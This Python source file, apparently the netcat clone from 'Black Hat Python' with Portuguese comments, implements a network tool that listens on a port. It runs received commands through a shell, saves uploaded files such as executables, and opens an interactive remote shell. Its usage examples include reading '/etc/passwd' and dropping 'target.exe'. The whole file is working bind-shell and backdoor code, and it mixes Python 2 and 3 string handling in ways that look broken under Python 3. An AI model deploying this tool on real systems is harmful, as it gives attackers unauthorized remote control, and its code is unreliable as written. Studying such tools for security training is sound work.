import sys
import socket
import getopt
import threading
import subprocess

#define algumas variáveis globais
listen                = False
command               = False
upload                = False
execute               = ''
target                = ''
upload_destination    = ''
port                  = 0

def run_command(command):
    #remove a quebra de linha
    command = command.rstrip()

    #executa o comando e obtém os dados de saída
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command. \r\n '
    
    #envia os dados de saída de volta ao cliente
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #verifica se é upload
    if len(upload_destination): # 1

       # 1 determinar se nossa ferramenta de rede está configurada para receber um arquivo 
       # quando uma conexão for estabelecida

        #lê todos os bytes e grava em nosso destino
        file_buffer=""

        #permanece lendo os dados até que não haja mais nenhum disponível
        while True: #2
            #Inicialmente, recebemos os dados do arquivo em um laço #2 para garantir que 
            # receberemos tudo; em seguida, simplesmente abrimos um handle de arquivo e gravamos o 
            # conteúdo nesse arquivo
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        # agora tentaremos gravar esses bytes
        try:
            # A flag wb garante que gravaremos o arquivo com o modo binário 
            # habilitado, o que garante o sucesso da carga e da gravação de um arquivo binário
            # executável.
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # confirma que gravamos o arquivo
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
      
    # verifica se é execução de comando
    if len(execute):

        # executa o comando
        output = run_command(execute)

        client_socket.send(output)

    # entra em outro laço se um shell de comandos foi solicitado
    if command:
        while True:
            # mostra um prompt simples
            client_socket.send("<BHP:#> ")
            # agora ficamos recebendo dados até vermos um linefeed (tecla enter)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                # envia de volta a saída do comando

            #Nós Temos um comando válido, então execute-o e envie de volta os resultados
            response = run_command(cmd_buffer)
            # envia de volta a resposta
            client_socket.send(response)
        # ele continua a executar comandos à medida que os enviamos e a saída é mandada de volta. 
        # Você perceberá que o código procura um novo caractere de quebra de linha para determinar 
        # quando o comando deverá ser processado, o que o torna emelhante ao netcat. 
        # Entretanto, se você estiver criando um cliente Python para conversar com esse código, 
        # lembre-se de adicionar o caractere de quebra de linha.

# isto é para conexões de entrada
def server_loop():
    global target
    global port

    #se não houver nenhum alvo definido, ouviremos todas as interfaces
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)    

    while True:
        client_socket, addr = server.accept()
        #dispara uma thread para cuidar de nosso novo cliente
        client_thread = threading.Thread(target=client_handler, args=(client_socket, ))
        client_thread.start()


def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #conecta-se ao nosso host-alvo
        client.connect((target,port))
        
        # teste para verificar se recebeu algum dado de entrada de stdin, se tudo ocorrer bem, enviaremos
        # os dados ao alvo remoto e receberemos o dado de volta (#2) até não haver mais dados para receber.
        if len(buffer):
            client.send(buffer)
        
        while True:
            
            #agora espera receber dados de volta
            recv_len = 1
            response = ''

            while recv_len: #2

                data = client.recv(4096)
                recv_len = len(data)
                response+=data

                if recv_len < 4096:
                    break
            
            print(response)

            #espera mais dados de entrada
            buffer = input()
            buffer += "\n"

            # envia dados
            client.send(buffer)
    except:
        
        print("[*] Exception! Exiting.")
         
        #encerra a conexão
        client.close()

def usage():
    print("NetCat em Python")
    print()
    print("Usage: nc.py -t target_host -p port")
    print("-l --listen                  - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run     - execute the given file upon receiving a connection")
    print('-c --command                 - initialize a command shell')
    print('-u --upload=destination      - upon receiving connection upload a file and write to [destination]')
    print()
    print()
    print('Examples: ')
    print('nc.py -t 192.168.0.1 -p 5555 -l -c')
    print('nc.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('nc.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"')
    print('echo "ABCDEFGI" | ./nc.py -t 192.168.11.12 -p 135')
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    # A lista de argumentos da linha de comando transmitida para um script Python. 
    # argv [0] é o nome do script (depende do sistema operacional se este é um nome de caminho completo
    # ou não). Se o comando foi executado usando a opção de linha de comando -c para o intérprete, 
    # argv [0] é definido como a string '-c'. Se nenhum nome de script foi passado para o interpretador 
    # Python, argv [0] é a string vazia.
    
    if not len(sys.argv[1:]):
        usage()

    # lê as opções de linha de comando

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ['help','listen','execute','target', \
            'port','command','upload'])                      
    except getopt.GetoptError as err:
        print(str(err))
        usage()                       

    for o,a in opts:
        if o in ('-h', "--help"):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    # iremos ouvir ou simplesmente enviar dados de stdin?
    if not listen and len(target) and port > 0:
        #Tenta-se imitar o netcat para ler dados de stdin e enviá-los pela rede. 

        # lê o buffer da linha de comando
        # isso causará um bloqueio, portanto envie um CTRL-D se não estiver
        # enviando dados de entrada para stdin
        buffer = sys.stdin.read()
        # send data off
        client_sender(buffer)
        
        #iremos ouvir a porta e, potencialmente,
        # faremos upload de dados, executaremos comandos e deixaremos um shell
        # de acordo com as opções de linha de comando anteriores
    if listen:
        server_loop() 

main()